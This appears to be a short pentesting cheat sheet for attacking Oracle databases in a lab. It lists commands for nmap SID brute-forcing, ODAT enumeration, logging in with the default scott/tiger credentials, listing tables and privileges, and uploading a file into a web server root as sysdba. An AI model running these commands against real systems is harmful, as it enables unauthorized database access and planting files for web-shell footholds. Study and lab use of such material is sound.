#### Nmap - SID Bruteforcing
```bash
nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```
#### ODAT (Oracle Database Attacking Tool)
```bash
./odat.py all -s <ip>
```
#### SQLplus - Log In
```bash
sqlplus scott/tiger@10.129.204.235/XE
```
XE sid is found by nmap oracle-sid-brute

*!* If error with shared libraries check ->  [link](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared)

#### Oracle RDBMS - Interaction (Similar to MySQL)
```bash
SQL> select table_name from all_tables;

SQL> select * from user_role_privs;
```

#### Oracle RDBMS - File Upload
```bash
./odat.py utlfile -s <ip> -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```
